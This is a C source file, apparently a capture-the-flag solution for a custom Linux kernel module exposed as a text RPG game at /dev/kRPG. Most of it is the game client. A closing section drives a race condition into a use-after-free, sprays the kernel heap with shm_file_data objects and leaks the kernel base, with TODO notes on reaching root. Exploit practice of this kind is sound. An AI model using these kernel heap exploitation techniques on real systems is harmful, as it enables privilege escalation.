// gcc solve.c -static -no-pie -o solve
#define _GNU_SOURCE

#include <sys/shm.h>
#include <pthread.h>
#include <sched.h>
#include <fcntl.h>
#include <time.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include "art.h"

#define PLAYER_HP 10

typedef struct {
	char			name[0x18];
	unsigned long	attack;
} weapon_t;

typedef struct {
	unsigned long 	health;
	weapon_t*	 	equipped;
	unsigned long	gold;
} player_t;

typedef struct {
	char 			name[0x20];
	unsigned long 	health;
	unsigned long	max_health;
	unsigned long	attack;
} mob_t;

typedef struct {
	int16_t			UUID;
	char 			name[0x20];
	uint8_t			refCount;
} items;

int won = 0;

#define QUERY_PLAYER 1
#define QUERY_WEAPON 13
#define QUERY_MOB 3
#define SHOP 4
#define QUERY_INVENTORY 5
#define MINE_GOLD 6
#define QUERY_BATTLE_STATUS 7
#define START_BATTLE 8
#define ATTACK 9
#define HEAL 10
#define RUN 11
#define USE_ITEM 12
#define DELETE_ITEM 15
#define CREEPER_EXPLODED 14
#define FEEDBACK 16
#define RESET 17

int fd = 0;
player_t player;
weapon_t equipped;
mob_t mob;

void clear_screen() {
	printf("\e[1;1H\e[2J\n");
}
void perror(const char* message) {
	puts(message);
	exit(-1);
}

void update_player() {
	ioctl(fd, QUERY_PLAYER, &player);
	if (ioctl(fd, QUERY_WEAPON, &equipped)) {
		player.equipped = NULL;
		memset((void*)&equipped, 0, sizeof(weapon_t));
	} else {
		player.equipped = &equipped;
	}
}

void update_mob() {
	ioctl(fd, QUERY_MOB, &mob);
}

void open_game() {
	fd = open("/dev/kRPG", O_RDWR);
	if (fd == -1) {
		perror("[!] Failed to open misc device kRPG!");
	}
}


// pretty printing

void print_top_border_player() {
	printf("\n %s%s%s%s %sPLAYER%s %s", BLU, BOX_TL, BOX_HORIZONTAL_BORDER, reset, MAG, reset, BLU);
	for (int i = 0; i < 27; i ++)
		printf(BOX_HORIZONTAL_BORDER);
	printf("%s%s", BOX_TR, reset);
}

void print_top_border_mob() {
	printf("   %s%s%s%s %s%*s%s %s", BLU, BOX_TL, BOX_HORIZONTAL_BORDER, reset, MAG, 6, (char*)&(mob.name), reset, BLU);
	for (int i = 0; i < 27; i ++)
		printf(BOX_HORIZONTAL_BORDER);
	printf("%s%s\n", BOX_TR, reset);
}

void print_vertical_border() {
	printf(" %s%s", BLU, BOX_VERTICAL_BORDER);
	for (int i = 0; i < 36; i++) 
		printf(" ");
	printf("%s%s", BOX_VERTICAL_BORDER, reset);
}

void print_health_bar(int cur_health, int max_health) {
	int i;
	int hp_bar = (cur_health*20)/max_health;
	printf(" %s%s      %sHP%s: %s", BLU, BOX_VERTICAL_BORDER, YEL, reset, GRN);
	for (i = 0; i < hp_bar; i++)
		printf(HP_BAR_S);
	printf("%s", reset);
	for (i = 0; i < (20 - hp_bar); i++)
		printf(HP_BAR_L);
	printf("      %s%s%s", BLU, BOX_VERTICAL_BORDER, reset);
}
void print_health_line(int cur_health, int max_health) {
	int i = 0;
	printf(" %s%s%s", BLU, BOX_VERTICAL_BORDER, reset);
	for (i = 0; i < 23; i ++)
		printf(" ");
	printf("%*d/%*d      ", 3, cur_health, 3, max_health);
	printf("%s%s%s", BLU, BOX_VERTICAL_BORDER, reset);
}

void print_stat_line(const char*stat, unsigned long value) {
	printf(" %s%s      %s%*s%s : %*lu", BLU, BOX_VERTICAL_BORDER, YEL, 7, stat, reset, 3, value);
	for (int i = 0; i < 17; i++)
		printf(" ");
	printf("%s%s%s", BLU, BOX_VERTICAL_BORDER, reset);
}

void print_horizontal_border() {
	printf(" %s%s", BLU, BOX_BL);
	for (int i = 0; i < 36; i ++) {
		printf("%s", BOX_HORIZONTAL_BORDER);
	}
	printf("%s%s", BOX_BR, reset);
}

void print_stats() {
	print_top_border_player();
	printf("\n");
	print_vertical_border();
	printf("\n");
	print_health_bar(player.health, PLAYER_HP);
	printf("\n");
	print_health_line(player.health, PLAYER_HP);
	printf("\n");
	print_vertical_border();
	printf("\n");
	if (player.equipped) {
		print_stat_line("ATTACK", player.equipped->attack);
	} else {
		print_stat_line("ATTACK", 0);
	}
	printf("\n");
	print_stat_line("GOLD", player.gold);
	printf("\n");
	print_vertical_border();
	printf("\n");
	print_horizontal_border();
	printf("\n");

}

void print_battle_stats() {
	print_top_border_player();
	print_top_border_mob();
	print_vertical_border();
	printf("  ");
	print_vertical_border();
	printf("\n");
	print_health_bar(player.health, PLAYER_HP);
	printf("  ");
	print_health_bar(mob.health, mob.max_health);
	printf("\n");
	print_health_line(player.health, PLAYER_HP);
	printf("  ");
	print_health_line(mob.health, mob.max_health);
	printf("\n");
	print_vertical_border();
	printf("  ");
	print_vertical_border();
	printf("\n");
	if (player.equipped) {
		print_stat_line("ATTACK", player.equipped->attack);
	} else {
		print_stat_line("ATTACK", 0);
	}
	printf("  ");
	print_stat_line("ATTACK", mob.attack);
	printf("\n");
	print_stat_line("GOLD", player.gold);
	printf("  ");
	print_vertical_border();
	printf("\n");
	print_vertical_border();
	printf("  ");
	print_vertical_border();
	printf("\n");
	print_horizontal_border();
	printf("  ");
	print_horizontal_border();
	printf("\n");
}

void print_shop_menu() {
	printf("\n\n %s%s %s%s%s%s", RED, "1.", YEL, "SWORD, +1 ATTACK ", BLU, "(1 GOLD)\n");
	printf(" %s%s %s%s%s%s", RED, "2.", YEL, "POTION, +10 HEALTH ", BLU, "(5 GOLD)\n");
	printf(" %s%s %s%s", RED, "3.", YEL, "BACK\n");
	printf(" %s❯❯❯%s ", GRN, reset);
}

void print_menu() {
	printf("\n %s1.%s FIGHT BOSS%s\n", RED, YEL, reset);
	printf(" %s2.%s MINE GOLD%s\n", RED, YEL, reset);
	printf(" %s3.%s GO SHOPPING%s\n", RED, YEL, reset);
	printf(" %s4.%s [NEW] OPEN INVENTORY%s\n", RED, YEL, reset);
	printf(" %s5.%s EXIT%s\n\n", RED, YEL, reset);
	if (won)
		printf(" %s6.%s SPAWN PREVIOUS MOB%s\n\n", RED, YEL, reset);
	printf(" %s❯❯❯%s ", GRN, reset);
}

void visit_shop() {
	int opt = 0;
	int res = 0;
	clear_screen();
	print_stats();
	print_shop_menu();
	scanf("%d", &opt);
	getchar();
	res = ioctl(fd, SHOP, opt);
	if (res == 1) {
		clear_screen();
		printf("%s\n\n\tYou failed to buy that item!%s\n", RED, reset);
		sleep(1);
		return;
	} else if (res == 2) {
		clear_screen();
		printf("\n\n\t%sYou have maxed out your inventory space for this item.%s", RED, reset);
		sleep(1);
		return;
	}
	printf("Successfully bought an item!");
}

void mine_gold() {
	clear_screen();
    printf("\n\n\n\n\n\n");
    printf("\t\tso we back in the mine...\n");
    sleep(1);
    printf("\t\tgot our pickaxe swinging from,\n");
    sleep(1);
    printf("\t\tside to side...\n");
    sleep(1);
    printf("\t\tside, side to side.\n");
    sleep(2);

	if (rand() % 100 < 20) {
		clear_screen();
		printf("\n\n%s%s%s", GRN, CREEPER, reset);
		sleep(2);
		printf("  Creeper?");
		sleep(2);
		printf("  Oh man...");
		sleep(2);
		ioctl(fd, CREEPER_EXPLODED);
	}
	ioctl(fd, MINE_GOLD);
}

typedef struct {
	char name[0x20];
	unsigned long size;
} feedback_header_t;

void feedback() {
	clear_screen();
	printf("%s%s%s", BHRED, GAME_TITLE , reset);
	printf("\n\n%sYou've defeated the DRAGON! How did you do it? Share with us your strategy and some feedback you have for the game!%s\n> ", GRN, reset);

	char feedback[0x1000];
	memset(feedback, 0, 0x1000);

	unsigned long len = read(0, feedback, 0x1000);

	feedback_header_t* buf = calloc(sizeof(feedback_header_t)+len, sizeof(char));
	strcpy((char*)buf, "FEEDBACK");
	buf->size = len;
	memcpy((char*)(buf + sizeof(feedback_header_t)), feedback, len);

	ioctl(fd, FEEDBACK, buf);
	won = 1;
	printf("\n\n%sThank you for your feedback. Hope you enjoyed the game, it will continue now.%s", YEL, reset);
	sleep(1);

	free(buf);
}

void enter_battle() {
	ioctl(fd, START_BATTLE);
}

void view_inventory() {
	int opt = 0;
	unsigned int count = ioctl(fd, QUERY_INVENTORY, 0);
	clear_screen();

	if (count == 0) {
		clear_screen();
		printf("\n\n\t%sYour inventory is empty!%s", RED, reset);
		sleep(2);
		return;
	}

	printf("\n\n\tNumber of Unique Items: %d\n\n", count);
	items* inv = calloc(count, sizeof(items));
	if (ioctl(fd, QUERY_INVENTORY, inv)) {
		perror("failed to query inventory items");
	}
	for (int j = 0; j < count; j++) {
		printf(" %s%*hi.%s %s %s(%d)%s\n", RED, 5, (uint16_t)inv[j].UUID, YEL, (char*)&(inv[j].name), BLU, (int)inv[j].refCount, reset);
	}
	puts("");
	puts("");
	free(inv);

	while (1) {
		puts("\n 1. Use Item");
		puts(" 2. Discard Item");
		puts(" 3. Leave Inventory");
		printf(" %s❯❯❯%s ", GRN, reset);
		scanf("%d", &opt);
		getchar();
		switch (opt) {
			case 1:
				printf("Item ID: ");
				scanf("%d", &opt);
				getchar();
				if (ioctl(fd, USE_ITEM, opt)) {
					puts("Invalid choice!");
				} else {
					puts("Item has been used!");
				}
				break;
			case 2:
				printf("Item ID: ");
				scanf("%d", &opt);
				getchar();
				if (ioctl(fd, DELETE_ITEM, opt)) {
					puts("Failed to delete item.");
				} else {
					puts("An item has been deleted.");
				}
				break;
			case 3:
				return;
			default:
				break;
		}
	}
}

int action() {
	int opt; 
	scanf("%d", &opt);
	getchar();

	switch (opt) {
		case 1:
			enter_battle();
			break;
		case 2:
			mine_gold();
			break;
		case 3:
			visit_shop();
			break;
		case 4:
			view_inventory();
			break;
		case 5:
			exit(0);
		case 6:
			if (won) {
				ioctl(fd, RESET);
				break;
			}

		default:
			break;
	}

	printf("\n");
	return 0;
}

int is_in_battle() {
	return ioctl(fd, QUERY_BATTLE_STATUS);
}

void print_battle_menu() {
	print_battle_stats();
	printf(" %s1. %sATTACK\n", RED, YEL);
	printf(" %s2. %sHEAL\n", RED, YEL);
	printf(" %s3. %sRUN\n", RED, YEL);
	printf(" %s❯❯❯%s ", GRN, reset);
}

void battle_action(void) {
	int opt = 3;
	scanf("%d", &opt);
	getchar();

	switch (opt) {
		case 1:
			if (ioctl(fd, ATTACK) == 1337)
				feedback();
			break;
		case 2:
			if (!ioctl(fd, HEAL)) {
				printf("\n\t%s[!]%s No health potions in inventory!\n", RED, reset);
				sleep(2);
			}
			break;
		case 3:
			ioctl(fd, RUN);
			break;
	}

}

void init() {
	setbuf(stdin, 0);
	setbuf(stdout, 0);
	srand(time(0));
	open_game();
}

/*
 *
 * EXPLOIT PART OF THE SCRIPT STARTS BELOW HERE
 *
 */

void buy_sword(void) {
        ioctl(fd, SHOP, 1);
}

void release_mutex(void) {
	while (1) 
		ioctl(fd, HEAL);
}


void race() {
	for (int i = 0; i < 5000; i ++ )
		ioctl(fd, MINE_GOLD);
	for (int i = 0; i < 254; i ++)
		ioctl(fd, SHOP, 1);

	ioctl(fd, USE_ITEM, 0x1337);
	items* inv = calloc(2, sizeof(items));
	pthread_t th1, th2, th3;
	pthread_create(&th3, NULL, release_mutex, NULL);

	while (1) {
			pthread_create(&th1, NULL, buy_sword, NULL);
			pthread_create(&th2, NULL, buy_sword, NULL);
			pthread_join(th1, NULL);
			pthread_join(th2, NULL);
			if (ioctl(fd, QUERY_INVENTORY, inv) || inv[0].refCount < 10)
				break;
			ioctl(fd, DELETE_ITEM, 0x1337);
	}

	pthread_cancel(th3);

}

/*
*
* 0x0000: 0x0000000000000000
* 0x0008: 0xffffffff82292ae0
* 0x0010: 0xffff88800ea09700
* 0x0018: 0xffffffff81e15540
*
*/
int alloc_shm(void) {
	int shmid;
	char* shmaddr;
	if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) 
		perror("shmget error");
	shmaddr = shmat(shmid, NULL, 0);
	if (shmaddr == (void*)-1) 
		perror("shmat error");
	return 0;
}

void spray_shmfd(void) {
	cpu_set_t t1_cpu, t2_cpu, t3_cpu, t4_cpu;
	pthread_t th1, th2, th3, th4;

	CPU_ZERO(&t1_cpu);
	CPU_ZERO(&t2_cpu);
	CPU_ZERO(&t3_cpu);
	CPU_ZERO(&t4_cpu);
	CPU_SET(0, &t1_cpu);
	CPU_SET(1, &t2_cpu);
	CPU_SET(2, &t3_cpu);
	CPU_SET(3, &t4_cpu);

	ioctl(fd, SHOP, 2);
	ioctl(fd, HEAL);
	while (equipped.attack <= 2) {
		pthread_create(&th1, NULL, alloc_shm, (void*)&t1_cpu);
		pthread_create(&th2, NULL, alloc_shm, (void*)&t2_cpu);
		pthread_create(&th3, NULL, alloc_shm, (void*)&t3_cpu);
		pthread_create(&th4, NULL, alloc_shm, (void*)&t4_cpu);
		pthread_join(th1, NULL);
		pthread_join(th2, NULL);
		pthread_join(th3, NULL);
		pthread_join(th4, NULL);
		ioctl(fd, QUERY_WEAPON, &equipped);
	}

	return;
}

int main() {
	printf("[*] open /dev/krpg device\n");
	init();
	printf("[*] trigger race condition\n");
	race();
	printf("[*] trigger uaf\n");
	printf("[*] spray heap with shm_file_data structs\n");
	spray_shmfd();

	uint64_t heap_leak = (uint64_t)equipped.attack;
	uint64_t kernel_base = *(uint64_t*)(equipped.name + 0x10) & 0xFFFFFFFFF0000000;
	printf("[!] heap leak: %p\n", heap_leak);
	printf("[!] kernel base: %p\n", kernel_base);

	ioctl(fd, START_BATTLE);
	ioctl(fd, ATTACK);
	ioctl(fd, ATTACK);
	ioctl(fd, ATTACK);
	
	// TODO: give feedback to allocate a feedback of controlled size, N, into kmalloc-N slab.
	// TODO: find a kheap object that is not allocated with ACCOUNT bit, that allow us to get AAW/AAR and get root

}
